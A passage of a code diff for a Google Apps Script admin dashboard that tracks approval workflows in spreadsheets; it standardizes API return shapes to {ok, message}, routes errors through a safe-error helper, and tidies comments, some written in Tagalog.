       var dhSheet = ss.getSheetByName(SHEET_NAMES.DIVHEAD_APPROVAL);
       if (dhSheet) {
@@ -1035,16 +1041,16 @@ function adminApi_resendToStage_(sessionId, stageType, approverEmail) {
         if (dhRows.length > 0) {
           result = notifyApplicant_(sessionId, 'Escalated to Division Head');
         } else {
-          return { ok: false, success: false, error: 'No Division Head workflow entry found.' };
+          return { ok: false, message: 'No Division Head workflow entry found.' };
         }
       } else {
-        return { ok: false, success: false, error: 'Division Head sheet not found.' };
+        return { ok: false, message: 'Division Head sheet not found.' };
       }
     }
-    if (result && result.success) {
+    if (result && result.ok) {
       logAuditTrail_(sessionId, 'Email Resend (Admin API)', { recipient: approverEmail || 'stage', type: normalizedStage, attempts: 1 });
     }
-    return result || { ok: false, success: false, error: 'Unknown stage.' };
+    return result || { ok: false, message: 'Unknown stage.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -1060,28 +1066,28 @@ function adminApi_resendToStage_(sessionId, stageType, approverEmail) {
              DivisionHead_Approval_Workflow, the email log (adminGetEmailLog) and audit
              logs (getAuditLogs). safeObj_ stringifies every cell to keep the GAS
              return serializable.
-  PARAMS:    - sessionId — required.
-  RETURNS:   {success:true, data:{application, approvals, ismWorkflow,
-             divHeadWorkflow, emailQueue, auditTrail}} or {success:false, error}.
+  PARAMS:    - sessionId: required.
+  RETURNS:   {ok: true, data:{application, approvals, ismWorkflow,
+             divHeadWorkflow, emailQueue, auditTrail}} or {ok: false, message}.
 
   STEPS
-    Step 1 — Load application (404 if missing).
-    Step 2-4 — Load approval / ISM / DivHead workflow rows.
-    Step 5-6 — Load email log and audit trail.
+    Step 1: Load application (404 if missing).
+    Step 2-4: Load approval / ISM / DivHead workflow rows.
+    Step 5-6: Load email log and audit trail.
 */
 function adminApi_getPipelineView(sessionId) {
   // SECURITY: re-authorize the caller (see adminApi_getEmailQueue).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
-    if (!sessionId) return { ok: false, success: false, error: 'Session ID required.' };
+    if (!sessionId) return { ok: false, message: 'Session ID required.' };
     sessionId = String(sessionId).trim();
     var ss = getSpreadsheet_();
 
     // 1. Application
     var app = getApplicationData_(sessionId);
-    if (!app) return { ok: false, success: false, error: 'Application not found.' };
+    if (!app) return { ok: false, message: 'Application not found.' };
 
     // 2. Approval Workflow
     var approvals = [];
@@ -1106,11 +1112,11 @@ function adminApi_getPipelineView(sessionId) {
 
     // 5. Email Queue
     var emailLog = adminGetEmailLog(sessionId);
-    var emailEntries = (emailLog && emailLog.success) ? emailLog.data : [];
+    var emailEntries = (emailLog && emailLog.ok) ? emailLog.data : [];
 
     // 6. Audit Trail
     var auditResult = getAuditLogs(app.Linked_ReqID || '', sessionId);
-    var auditLogs = (auditResult && auditResult.success) ? auditResult.auditLogs : [];
+    var auditLogs = (auditResult && auditResult.ok) ? auditResult.auditLogs : [];
 
     function safeObj_(row) {
       if (!row) return {};
@@ -1121,7 +1127,7 @@ function adminApi_getPipelineView(sessionId) {
 
     // Append-only workflow: the pipeline view shows the LIVE ladder, so drop earlier rounds.
     // (Historic rounds are surfaced by PIA's approval history, not by this operational view.)
-    return { ok: true, success: true, data: {
+    return { ok: true, data: {
       application: safeObj_(app),
       approvals: keepCurrentRoundRows_(approvals).map(safeObj_),
       ismWorkflow: keepCurrentRoundRows_(ismEntries).map(safeObj_),
@@ -1148,7 +1154,7 @@ var __SS_HANDLE_CACHE = { id: null, ss: null };
 
 /*
   Function: getSpreadsheet_
-  LAYMAN:    Opens the one shared database spreadsheet — once per run, then reuses it.
+  LAYMAN:    Opens the one shared database spreadsheet, once per run, then reuses it.
   TECHNICAL: Reads SPREADSHEET_ID from Script Properties and opens it by ID; throws
              if the property is missing. The handle is memoized in __SS_HANDLE_CACHE.
   PARAMS:    (none)
@@ -1170,14 +1176,14 @@ function getSpreadsheet_() {
              for older databases.
   TECHNICAL: ss.getSheetByName(name) then getSheetByName(getPrefix_()+name); throws a
              descriptive error if neither resolves.
-  PARAMS:    - name — bare tab name (usually a SHEET_NAMES value).
+  PARAMS:    - name: bare tab name (usually a SHEET_NAMES value).
   RETURNS:   Sheet object (throws if not found).
 */
 function getSheet_(name) {
   var ss = getSpreadsheet_();
   var prefix = getPrefix_();
 
-  // Try exact name first (most common — sheets usually have no prefix)
+  // Try exact name first (most common, sheets usually have no prefix)
   var sheet = ss.getSheetByName(name);
   if (sheet) return sheet;
 
@@ -1200,15 +1206,15 @@ function getSheet_(name) {
 
   TECHNICAL: Execution-scoped memo of getDataRange().getValues(), keyed by sheet name.
     1. __SHEET_CACHE is null (OFF) by default, so readSheetValues_ degrades to exactly the
-       call it replaced — which is what makes converting every read site a behaviour-
+       call it replaced, which is what makes converting every read site a behaviour-
        preserving no-op on its own.
     2. Enabled ONLY around READ-ONLY entry points. Never on a path that writes. That makes
        write-then-stale-read structurally impossible rather than a discipline problem.
     3. A cache hit returns the SAME array reference, not a copy. Never mutate a cached read.
-    Nesting composes — the outermost withSheetCache_ owns the lifetime.
+    Nesting composes: the outermost withSheetCache_ owns the lifetime.
     This is a different mechanism from __SS_HANDLE_CACHE above: that memoizes a live handle
     (always safe), this memoizes VALUES (safe only under rules 1-3).
-    Kept deliberately identical to the copy in Phase 2/pia_code.js — separate GAS projects
+    Kept deliberately identical to the copy in Phase 2/pia_code.js, separate GAS projects
     cannot share code, so the two must be edited together.
 */
 var __SHEET_CACHE = null;
@@ -1218,7 +1224,7 @@ var __SHEET_CACHE = null;
   LAYMAN:    Turn the cache on for the duration of one function, then turn it off again.
   TECHNICAL: Restores the previous state in a finally block so a throw cannot leave caching
              switched on. Re-entrant: a nested call yields lifetime ownership to the outer one.
-  PARAMS:    - fn — zero-arg function to run with caching enabled.
+  PARAMS:    - fn: zero-arg function to run with caching enabled.
   RETURNS:   Whatever fn returns (exceptions propagate untouched).
 */
 function withSheetCache_(fn) {
@@ -1236,11 +1242,11 @@ function withSheetCache_(fn) {
   LAYMAN:    Read every row of a tab. If the cache is on and this tab was already read in
              this same run, hand back what we already have instead of downloading it again.
   TECHNICAL: Drop-in replacement for `sheet.getDataRange().getValues()`.
-             🚩 A null sheet THROWS, deliberately — the call this replaced threw a TypeError
+             🚩 A null sheet THROWS, deliberately, the call this replaced threw a TypeError
              in that case, and returning [] instead would quietly turn a fail-loud path into
              a fail-silent one. Same control flow as before, just a readable message.
-  PARAMS:    - sheet — a Sheet object.
-  RETURNS:   2-D array of cell values. Shared reference on a cache hit — do not mutate.
+  PARAMS:    - sheet: a Sheet object.
+  RETURNS:   2-D array of cell values. Shared reference on a cache hit, do not mutate.
 */
 function readSheetValues_(sheet) {
   if (!sheet) throw new Error('readSheetValues_: sheet is null (the tab could not be opened or created).');
@@ -1256,7 +1262,7 @@ function readSheetValues_(sheet) {
   Function: invalidateSheetCache_
   LAYMAN:    Forget the stored copy of a tab so the next read is fresh.
   TECHNICAL: No-op when the cache is off. Drops one entry by Sheet or name, or clears all.
-  PARAMS:    - sheetOrName — a Sheet, a tab-name string, or nothing (clear everything).
+  PARAMS:    - sheetOrName: a Sheet, a tab-name string, or nothing (clear everything).
   RETURNS:   undefined.
 */
 function invalidateSheetCache_(sheetOrName) {
@@ -1275,24 +1281,24 @@ function invalidateSheetCache_(sheetOrName) {
              UrlFetchApp and PropertiesService to force the OAuth consent for all
              scopes the app uses. Re-deploy afterward so new scopes apply to all users.
   PARAMS:    (none)
-  RETURNS:   {success:true, message}.
+  RETURNS:   {ok: true, message}.
 */
 function forceAuthorize() {
   // SECURITY: editor-run helper; cannot take a trailing underscore, so gate on owner context.
-  if (!isOwnerContext_()) return { ok: false, success: false, error: 'Not authorized.' };
-  // MailApp — email sending
+  if (!isOwnerContext_()) return { ok: false, message: 'Not authorized.' };
+  // MailApp: email sending
   MailApp.getRemainingDailyQuota();
-  // SpreadsheetApp — reading/writing sheets
+  // SpreadsheetApp: reading/writing sheets
   var ss = getSpreadsheet_();
   SpreadsheetApp.setActiveSpreadsheet(ss);
-  // DriveApp — file name lookups in getAdminData
+  // DriveApp: file name lookups in getAdminData
   DriveApp.getRootFolder().getName();
-  // UrlFetchApp — PIA cross-project API calls
+  // UrlFetchApp: PIA cross-project API calls
   UrlFetchApp.getRequest('https://script.google.com');
-  // PropertiesService — script properties
+  // PropertiesService: script properties
   PropertiesService.getScriptProperties().getKeys();
-  Logger.log('[AUTH] forceAuthorize completed — all scopes touched successfully.');
-  return { ok: true, success: true, message: 'Authorization check complete. Re-deploy the web app if scopes changed.' };
+  Logger.log('[AUTH] forceAuthorize completed, all scopes touched successfully.');
+  return { ok: true, message: 'Authorization check complete. Re-deploy the web app if scopes changed.' };
 }
 
 /*
@@ -1300,7 +1306,7 @@ function forceAuthorize() {
   LAYMAN:    A quick "is the database reachable?" check the frontend can call first.
   TECHNICAL: Attempts getSpreadsheet_() and reports success/failure.
   PARAMS:    (none)
-  RETURNS:   {success:true, message} or {success:false, error}.
+  RETURNS:   {ok: true, message} or {ok: false, message}.
 */
 function ping() {
   // SECURITY: reachable from any domain account via google.script.run regardless of the page
@@ -1308,10 +1314,10 @@ function ping() {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     getSpreadsheet_();
-    return { ok: true, success: true, message: 'Spreadsheet accessible.' };
+    return { ok: true, message: 'Spreadsheet accessible.' };
   } catch (e) {
     return safeError_(e, ERR.INTERNAL);
   }
@@ -1325,7 +1331,7 @@ function ping() {
   TECHNICAL: Opens the spreadsheet, probes the five core sheets by bare and prefixed
              names, and returns a status string per sheet.
   PARAMS:    (none)
-  RETURNS:   {success:true, debug:{...}} or {success:false, error}.
+  RETURNS:   {ok: true, debug:{...}} or {ok: false, message}.
 */
 function getAdminDataDebug() {
   // SECURITY: reachable from any domain account via google.script.run regardless of the page
@@ -1333,7 +1339,7 @@ function getAdminDataDebug() {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var info = { steps: [] };
     
@@ -1363,7 +1369,7 @@ function getAdminDataDebug() {
       }
     }
     
-    return { ok: true, success: true, debug: info };
+    return { ok: true, debug: info };
   } catch (e) {
     return safeError_(e, ERR.INTERNAL);
   }
@@ -1375,8 +1381,8 @@ function getAdminDataDebug() {
              the keys. The workhorse for reading data everywhere in this file.
   TECHNICAL: getDataRange().getValues(); first row = headers; each subsequent row
              becomes {header: cellValue}. Returns [] for empty/header-only sheets.
-             Values stay raw (Dates, numbers) — callers stringify as needed.
-  PARAMS:    - sheet — a Sheet object.
+             Values stay raw (Dates, numbers), callers stringify as needed.
+  PARAMS:    - sheet: a Sheet object.
   RETURNS:   Array of plain objects (possibly empty).
 */
 function sheetToObjects_(sheet) {
@@ -1428,7 +1434,7 @@ function sheetToObjectsFiltered_(sheet, filterKey, filterValue) {
   Function: keepCurrentRoundRows_
 
   LAYMAN (Tropang Ex):
-  Dati, tuwing nag-re-resubmit ang isang requestor, BINUBURA ng PIA ang lumang approval rows —
+  Dati, tuwing nag-re-resubmit ang isang requestor, BINUBURA ng PIA ang lumang approval rows,
   kaya isang set lang ang laging nakikita ng Admin dashboard. Ngayon hindi na binubura (para
   hindi mawala ang kasaysayan), kaya kung hindi natin sasalain, magkakadoble-doble ang mga
   approver sa dashboard: isang set kada round. Kinukuha lang nito yung pinakabagong round.
@@ -1441,7 +1447,7 @@ function sheetToObjectsFiltered_(sheet, filterKey, filterValue) {
   Applies to the dashboard/pipeline STATUS views, which want the live ladder. Full multi-round
   history is a separate concern (PIA's getUnifiedHistory_ / DCS's getApprovalHistoryRounds_).
 
-  PARAMS:    - rows — array of row objects from sheetToObjects_ / sheetToObjectsFiltered_.
+  PARAMS:    - rows: array of row objects from sheetToObjects_ / sheetToObjectsFiltered_.
   RETURNS:   A filtered array (the same array instance is never mutated). [] / single-round input
              passes through unchanged.
 */
@@ -1461,11 +1467,11 @@ function keepCurrentRoundRows_(rows) {
 
 /*
   Function: debugSheets
-  LAYMAN:    Lists the real tab names in the spreadsheet — useful for spotting a typo
+  LAYMAN:    Lists the real tab names in the spreadsheet, useful for spotting a typo
              or rename.
   TECHNICAL: Iterates ss.getSheets() and returns their names.
   PARAMS:    (none)
-  RETURNS:   {success:true, sheets:[name...]} or {success:false, error}.
+  RETURNS:   {ok: true, sheets:[name...]} or {ok: false, message}.
 */
 // ─── Debug: list actual sheet names ────────────────────────────────────────────
 function debugSheets() {
@@ -1474,7 +1480,7 @@ function debugSheets() {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var ss = getSpreadsheet_();
     var sheets = ss.getSheets();
@@ -1482,7 +1488,7 @@ function debugSheets() {
     for (var i = 0; i < sheets.length; i++) {
       names.push(sheets[i].getName());
     }
-    return { ok: true, success: true, sheets: names };
+    return { ok: true, sheets: names };
   } catch (e) {
     return safeError_(e, ERR.INTERNAL);
   }
@@ -1492,8 +1498,8 @@ function debugSheets() {
   Function: getAdminData
   LAYMAN:    The big one. Builds the entire admin dashboard table: it reads the DCS
              requests, the PIA applications, and all the approval sheets, then stitches
-             them together one row per request — name, department, access type, DCS
-             status, PIA progress, approval status, dates — plus the raw data each
+             them together one row per request, name, department, access type, DCS
+             status, PIA progress, approval status, dates, plus the raw data each
              modal needs. It also swaps stored Drive file IDs for real file names.
   TECHNICAL: Single-pass join. Reads Data_Collection, Applications, Approval_Workflow,
              ISM_Approval_Workflow, DivisionHead_Approval_Workflow; builds lookup maps
@@ -1504,13 +1510,13 @@ function debugSheets() {
              Drive file names resolved (cached). EVERYTHING is wrapped in try/catch
              because GAS V8 returns null on any uncaught throw.
   PARAMS:    (none)
-  RETURNS:   {success:true, data:[row...]} or {success:false, error}.
+  RETURNS:   {ok: true, data:[row...]} or {ok: false, message}.
 
   STEPS
-    Step 1 — Validate spreadsheet access.
-    Step 2 — Read all five sheets (each individually validated).
-    Step 3 — Build ReqID/SessionID lookup maps.
-    Step 4 — For each DCS row: join, compute statuses, serialize to safe POJOs.
+    Step 1: Validate spreadsheet access.
+    Step 2: Read all five sheets (each individually validated).
+    Step 3: Build ReqID/SessionID lookup maps.
+    Step 4: For each DCS row: join, compute statuses, serialize to safe POJOs.
 */
 // ─── getAdminData() - Main Data Fetch ──────────────────────────────────────────
 function getAdminData() {
@@ -1519,9 +1525,9 @@ function getAdminData() {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   // PERF: the dashboard join pulls five whole sheets. On its own that is five reads with no
-  // repeats, so the cache buys little HERE — its value is that getAgingReport_ wants three of
+  // repeats, so the cache buys little HERE, its value is that getAgingReport_ wants three of
   // the same sheets and runs under this same wrapper, so the aging figures come out free.
   // Read-only path: this function only joins and returns, it never writes.
   return withSheetCache_(getAdminDataImpl_);
@@ -1531,10 +1537,10 @@ function getAdminData() {
   Function: getAdminDataImpl_
   LAYMAN:    The actual dashboard join. Split out only so getAdminData can wrap it in one
              sheet cache shared with the aging report; the logic is unchanged.
-  TECHNICAL: See getAdminData above for contract. Private — always go through the wrapper,
+  TECHNICAL: See getAdminData above for contract. Private, always go through the wrapper,
              which is also where the checkAccess_ gate lives.
   PARAMS:    (none)
-  RETURNS:   {success:true, data:[...]} or {success:false, error}.
+  RETURNS:   {ok: true, data:[...]} or {ok: false, message}.
 */
 function getAdminDataImpl_() {
   // CRITICAL: outer try-catch wrapping EVERYTHING. GAS V8 returns null if any
@@ -1579,48 +1585,48 @@ function getAdminDataImpl_() {
     try {
       var ss = getSpreadsheet_();
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: SPREADSHEET_ID invalid or inaccessible: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     // ── Step 2: Read all sheets with individual validation ──
     try {
       dcSheet = ss.getSheetByName(SHEET_NAMES.DATA_COLLECTION);
-      if (!dcSheet) return { ok: false, success: false, error: 'getAdminData: Sheet "' + SHEET_NAMES.DATA_COLLECTION + '" not found.' };
+      if (!dcSheet) return { ok: false, message: 'getAdminData: Sheet "' + SHEET_NAMES.DATA_COLLECTION + '" not found.' };
       dcRows = sheetToObjects_(dcSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: Failed reading Data_Collection: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     try {
       appSheet = ss.getSheetByName(SHEET_NAMES.APPLICATIONS);
-      if (!appSheet) return { ok: false, success: false, error: 'getAdminData: Sheet "' + SHEET_NAMES.APPLICATIONS + '" not found.' };
+      if (!appSheet) return { ok: false, message: 'getAdminData: Sheet "' + SHEET_NAMES.APPLICATIONS + '" not found.' };
       appRows = sheetToObjects_(appSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: Failed reading Applications: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     try {
       awSheet = ss.getSheetByName(SHEET_NAMES.APPROVAL_WORKFLOW);
-      if (!awSheet) return { ok: false, success: false, error: 'getAdminData: Sheet "' + SHEET_NAMES.APPROVAL_WORKFLOW + '" not found.' };
+      if (!awSheet) return { ok: false, message: 'getAdminData: Sheet "' + SHEET_NAMES.APPROVAL_WORKFLOW + '" not found.' };
       awRows = sheetToObjects_(awSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: Failed reading Approval_Workflow: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     try {
       ismSheet = ss.getSheetByName(SHEET_NAMES.ISM_APPROVAL);
-      if (!ismSheet) return { ok: false, success: false, error: 'getAdminData: Sheet "' + SHEET_NAMES.ISM_APPROVAL + '" not found.' };
+      if (!ismSheet) return { ok: false, message: 'getAdminData: Sheet "' + SHEET_NAMES.ISM_APPROVAL + '" not found.' };
       ismRows = sheetToObjects_(ismSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: Failed reading ISM_Approval_Workflow: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     try {
       dhSheet = ss.getSheetByName(SHEET_NAMES.DIVHEAD_APPROVAL);
-      if (!dhSheet) return { ok: false, success: false, error: 'getAdminData: Sheet "' + SHEET_NAMES.DIVHEAD_APPROVAL + '" not found.' };
+      if (!dhSheet) return { ok: false, message: 'getAdminData: Sheet "' + SHEET_NAMES.DIVHEAD_APPROVAL + '" not found.' };
       dhRows = sheetToObjects_(dhSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAdminData: Failed reading DivisionHead_Approval_Workflow: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     // ── Step 3: Build lookup maps ──
@@ -1690,7 +1696,7 @@ function getAdminDataImpl_() {
       var pia = '\u2014';
       try { pia = computePiaDisplay_(app, sessionId); } catch (e2) { pia = 'Error'; }
       
-      // Convert raw sheet row to safe POJO — sheet cells may contain Date objects
+      // Convert raw sheet row to safe POJO, sheet cells may contain Date objects
       // or other non-serializable values that crash the GAS return path.
       var safeDcsData = {};
       try {
@@ -1742,16 +1748,16 @@ function getAdminDataImpl_() {
         date:           String(dc.Timestamp || ''),
         sessionId:      String(sessionId || ''),
         applicantEmail: String(dc.UserEmail || ''),
-        // Raw data for modals — safe string-only objects
+        // Raw data for modals: safe string-only objects
         dcsData:        safeDcsData,
         piaData:        safePiaData
       });
     }
     
-    return { ok: true, success: true, data: rows };
+    return { ok: true, data: rows };
   } catch (e) {
-    // Absolute last resort — catch ANYTHING that might have escaped
-    return { ok: false, success: false, error: 'getAdminData: [FATAL] ' + e.message };
+    // Absolute last resort: catch ANYTHING that might have escaped
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -1761,7 +1767,7 @@ function getAdminDataImpl_() {
   LAYMAN:    Safely turns a Metadata_JSON cell into an object; returns {} if it's
              empty or unparseable.
   TECHNICAL: JSON.parse if string; passes through if already an object; {} on error.
-  PARAMS:    - jsonStr — string or object.
+  PARAMS:    - jsonStr: string or object.
   RETURNS:   Object (never null).
 */
 function parseMetadata_(jsonStr) {
@@ -1780,7 +1786,7 @@ function parseMetadata_(jsonStr) {
              "COMPLETE", "Complete", "completed" all become "DCS Completed".
   TECHNICAL: Uppercases and maps COMPLETE/COMPLETED -> 'DCS Completed'; otherwise
              returns the trimmed original or 'Unknown'.
-  PARAMS:    - rawStatus — the stored Data_Collection.Status value.
+  PARAMS:    - rawStatus: the stored Data_Collection.Status value.
   RETURNS:   Display string.
 */
 function normalizeDcsStatus_(rawStatus) {
@@ -1793,13 +1799,13 @@ function normalizeDcsStatus_(rawStatus) {
 /*
   Function: computePiaStatus_
   LAYMAN:    Works out how far along the PIA questionnaire is: Not Started, In
-             Progress, or Complete — used only as a fallback when the application has
+             Progress, or Complete: used only as a fallback when the application has
              no explicit Status.
   TECHNICAL: Inspects PIA_1_Data..PIA_5_Data. A section counts as completed if its
              cell text is COMPLETED/COMPLETE/APPROVED, or its JSON .status is one of
              those, or it is malformed JSON (lenient). Complete when completed===total
              of the filled sections.
-  PARAMS:    - app — Applications row object (or null).
+  PARAMS:    - app: Applications row object (or null).
   RETURNS:   'No Application' | 'Not Started' | 'In Progress' | 'Complete'.
 */
 function computePiaStatus_(app) {
@@ -1825,10 +1831,10 @@ function computePiaStatus_(app) {
         if (ps === 'completed' || ps === 'complete' || ps === 'approved') {
           completed++;
         }
-        // If ps is a non-empty string that's not a completion status — not counted
+        // If ps is a non-empty string that's not a completion status, not counted
       } catch (e) {
         // Not JSON, not a direct status keyword.
-        // If it looks like JSON (starts with { or [), it's malformed — count as completed
+        // If it looks like JSON (starts with { or [), it's malformed, count as completed
         if (cellStr.charAt(0) === '{' || cellStr.charAt(0) === '[') completed++;
       }
     }
@@ -1869,12 +1875,12 @@ function computePiaDisplay_(app, sessionId) {
              Otherwise collects each row's Status||Decision across approvals / ISM /
              DivHead: any Denied/Rejected/Return(ed) -> 'Denied'; all 'Approved' ->
              'Approved'; none -> 'Pending'; mixed -> 'In Progress'.
-  PARAMS:    - app — Applications row (or null).
-             - approvals, ismApprovals, dhApprovals — arrays of workflow rows.
+  PARAMS:    - app: Applications row (or null).
+             - approvals, ismApprovals, dhApprovals, arrays of workflow rows.
   RETURNS:   'Pending' | 'In Progress' | 'Approved' | 'Denied'.
 */
 function computeApprovalStatus_(app, approvals, ismApprovals, dhApprovals) {
-  // FIRST: check the application's own Status column — it's the authoritative signal
+  // FIRST: check the application's own Status column, it's the authoritative signal
   if (app) {
     var appStatus = String(app.Status || '').trim();
     // Terminal statuses from the application override workflow computation
@@ -1924,15 +1930,15 @@ function computeApprovalStatus_(app, approvals, ismApprovals, dhApprovals) {
              types store IDs in different columns); else returns empty. When sessionId
              is present, also loads filtered Approval / ISM / DivHead rows. safeRow_
              stringifies every cell.
-  PARAMS:    - reqId — linked DCS ReqID (used when sessionId absent).
-             - sessionId — preferred key.
-  RETURNS:   {success:true, auditLogs, approvals, ismApprovals, dhApprovals}
-             or {success:false, error}.
+  PARAMS:    - reqId: linked DCS ReqID (used when sessionId absent).
+             - sessionId: preferred key.
+  RETURNS:   {ok: true, auditLogs, approvals, ismApprovals, dhApprovals}
+             or {ok: false, message}.
 
   STEPS
-    Step 1 — Open sheet; read Risk_Audit.
-    Step 2 — Filter rows by sessionId, then reqId, else empty.
-    Step 3 — If sessionId, attach the three workflow row sets.
+    Step 1: Open sheet; read Risk_Audit.
+    Step 2: Filter rows by sessionId, then reqId, else empty.
+    Step 3: If sessionId, attach the three workflow row sets.
 */
 // ─── getAuditLogs() ────────────────────────────────────────────────────────────
 function getAuditLogs(reqId, sessionId) {
@@ -1941,26 +1947,26 @@ function getAuditLogs(reqId, sessionId) {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var ss;
     try {
       ss = getSpreadsheet_();
     } catch (e) {
-      return { ok: false, success: false, error: 'getAuditLogs: SPREADSHEET_ID invalid: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     var auditSheet, auditRows;
     try {
       auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
-      if (!auditSheet) return { ok: false, success: false, error: 'getAuditLogs: Sheet "' + SHEET_NAMES.RISK_AUDIT + '" not found.' };
+      if (!auditSheet) return { ok: false, message: 'getAuditLogs: Sheet "' + SHEET_NAMES.RISK_AUDIT + '" not found.' };
       auditRows = sheetToObjects_(auditSheet);
     } catch (e) {
-      return { ok: false, success: false, error: 'getAuditLogs: Failed reading Risk_Audit: ' + e.message };
+      return safeError_(e, ERR.INTERNAL);
     }
     
     if (sessionId) {
-      // Filter by SessionID (primary path — entry has a linked Application)
+      // Filter by SessionID (primary path, entry has a linked Application)
       var filtered = [];
       for (var i = 0; i < auditRows.length; i++) {
         var rowSessionId = String(auditRows[i].SessionID || '');
@@ -1970,7 +1976,7 @@ function getAuditLogs(reqId, sessionId) {
       }
       auditRows = filtered;
     } else if (reqId) {
-      // No SessionID — filter by ReqID instead.
+      // No SessionID: filter by ReqID instead.
       // Different audit event types store identifiers in different columns:
       //   DELETE_ENTRY → SessionID column (sessionId || reqId)
       //   ADMIN_REROUTE → InternalFlags column (linkedReqId)
@@ -1987,7 +1993,7 @@ function getAuditLogs(reqId, sessionId) {
       }
       auditRows = filtered;
     } else {
-      // Neither sessionId nor reqId — return nothing instead of leaking all logs
+      // Neither sessionId nor reqId: return nothing instead of leaking all logs
       auditRows = [];
     }
 
@@ -2031,20 +2037,20 @@ function getAuditLogs(reqId, sessionId) {
     }
 
     return {
-      ok: true, success: true,
+      ok: true,
       auditLogs: auditRows.map(safeRow_),
       approvals: approvals,
       ismApprovals: ismApprovals,
       dhApprovals: dhApprovals
     };
   } catch (e) {
-    return { ok: false, success: false, error: 'getAuditLogs: [FATAL] ' + e.message };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
 
 // ════════════════════════════════════════════════════════════════════════════════════
-//  SLA / AGING  —  "where do requests get stuck, and for how long?"
+//  SLA / AGING: "where do requests get stuck, and for how long?"
 // ════════════════════════════════════════════════════════════════════════════════════
 
 /*
@@ -2065,10 +2071,10 @@ function getAuditLogs(reqId, sessionId) {
     - epoch milliseconds (number/string) PIA draft timestamps
     - a real Date object                 whenever Sheets auto-converted the cell
   Returns null rather than an epoch-0 Date for junk, so callers can distinguish "unknown"
-  from "very old" — that distinction is the whole point in an aging report.
+  from "very old", that distinction is the whole point in an aging report.
 
   PARAMS:
-  - v — the raw cell value.
+  - v: the raw cell value.
 
   RETURNS:
   A Date, or null when the value is empty or unparseable.
@@ -2090,7 +2096,7 @@ function parseAnyDate_(v) {
   var s = String(v).trim();
   if (!s) return null;
 
-  // 'YYYY-MM-DD' — build it locally. `new Date('2026-08-04')` parses as UTC midnight, which
+  // 'YYYY-MM-DD', build it locally. `new Date('2026-08-04')` parses as UTC midnight, which
   // in Asia/Manila is 8am the SAME day; harmless for a day count, but being explicit avoids
   // an off-by-one for anyone who later compares these to a local timestamp.
   var ymd = s.match(/^(\d{4})-(\d{2})-(\d{2})$/);
@@ -2102,7 +2108,7 @@ function parseAnyDate_(v) {
     if (!isNaN(dEpoch.getTime())) return dEpoch;
   }
 
-  // ISO, and the en-PH locale string — Date.parse handles both.
+  // ISO, and the en-PH locale string: Date.parse handles both.
   var d = new Date(s);
   return isNaN(d.getTime()) ? null : d;
 }
@@ -2112,8 +2118,8 @@ function parseAnyDate_(v) {
   LAYMAN:    Ilang araw na ang nakalipas mula sa petsang ito? Buong araw ang bilang, hindi oras.
   TECHNICAL: Whole-day difference from local midnight to local midnight, so a row notified late
              yesterday reads as 1 day and not 0. Returns null for an unparseable date, matching
-             parseAnyDate_ — "unknown age" must not silently become "0 days old".
-  PARAMS:    - v — any of the date encodings parseAnyDate_ accepts.
+             parseAnyDate_, "unknown age" must not silently become "0 days old".
+  PARAMS:    - v: any of the date encodings parseAnyDate_ accepts.
   RETURNS:   A non-negative integer, or null.
 */
 function daysSince_(v) {
@@ -2127,7 +2133,7 @@ function daysSince_(v) {
 
 /*
   Constant: AGING_LIVE_STATUSES
-  LAYMAN:    Yung mga estado na "buhay pa" — hinihintay pa ng tao. Kung tapos na (Complete,
+  LAYMAN:    Yung mga estado na "buhay pa", hinihintay pa ng tao. Kung tapos na (Complete,
              Denied, Returned sa requestor), wala nang dapat bilangin.
   TECHNICAL: Mirrors the pre-filter in PIA's sendDailyReminders_. Kept as its own constant
              rather than reusing that one because the two projects cannot share code and the
@@ -2159,19 +2165,19 @@ var AGING_BUCKETS = [
   approver ang kasalukuyang hinihintay ng bawat buhay na request, tapos binibilang kung
   ilang araw na siyang naghihintay mula noong una siyang na-email.
 
-  Walang bagong column na kailangan. Nandiyan na lahat ng datos — hindi lang dati
+  Walang bagong column na kailangan. Nandiyan na lahat ng datos, hindi lang dati
   binibilang.
 
   TECHNICAL:
   Scans the three workflow sheets for Pending rows, scoped to the CURRENT round (aging asks
